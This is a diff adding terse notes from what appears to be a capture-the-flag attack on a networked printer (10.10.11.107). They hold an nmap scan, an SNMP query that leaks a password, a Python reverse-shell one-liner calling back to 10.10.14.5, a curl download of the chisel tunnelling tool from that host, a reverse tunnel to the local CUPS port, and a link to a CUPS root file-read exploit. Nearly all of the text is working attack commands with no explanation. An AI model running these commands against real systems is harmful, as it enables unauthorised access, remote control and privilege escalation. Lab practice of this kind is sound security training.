@@ -1,0 +1,33 @@
+└─$ nmap -A 10.10.11.107 -p 1-65535 -T5 -Pn
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-30 13:43 CEST
+Warning: 10.10.11.107 giving up on port because retransmission cap hit (2).
+Stats: 0:01:38 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 0.00% done
+Nmap scan report for 10.10.11.107
+Host is up (0.033s latency).
+Not shown: 65391 closed tcp ports (conn-refused), 143 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+23/tcp open  telnet?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
+|     JetDirect
+|     Password:
+|   NULL: 
+|_    JetDirect
+
+
+snmpwalk -v 2c -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
+P@ssw0rd@123!!123
+
+exec export RHOST="10.10.14.5";export RPORT=5555;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+
+ curl -L http://10.10.14.5/chisel_linux -o chisel_linux
+ wget 
+ ./chisel_x86.1 client 10.10.14.5:9001 R:631:127.0.0.1:631
+ 
+ 
+ https://github.com/p1ckzi/CVE-2012-5519/blob/main/cups-root-file-read.sh
+ exploit cups
+ 
+ 
+
